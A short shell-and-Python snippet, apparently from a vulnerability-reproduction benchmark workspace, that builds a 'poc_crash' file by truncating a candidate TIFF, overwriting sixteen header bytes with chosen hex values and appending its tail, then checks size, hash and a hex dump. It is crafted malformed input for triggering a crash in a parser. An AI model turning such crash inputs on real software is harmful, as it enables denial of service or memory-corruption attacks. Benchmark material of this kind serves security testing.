cp /CybinGym_workdir/poc_crash /tmp/poc_adjacent
python3 - <<'PY'
from pathlib import Path
src=Path('/CybinGym_workdir/candidate_tiff').read_bytes()
base=bytearray(src[:528])
base[512:528]=bytes.fromhex('49 53 01 00 0c 03 00 03 00 03 00 03 00 01 00 80')
Path('/CybinGym_workdir/poc_crash').write_bytes(base+src[-108:])
PY
stat -c '%s bytes' /CybinGym_workdir/poc_crash
sha256sum /CybinGym_workdir/poc_crash
xxd -g1 -s 496 -l 56 /CybinGym_workdir/poc_crash
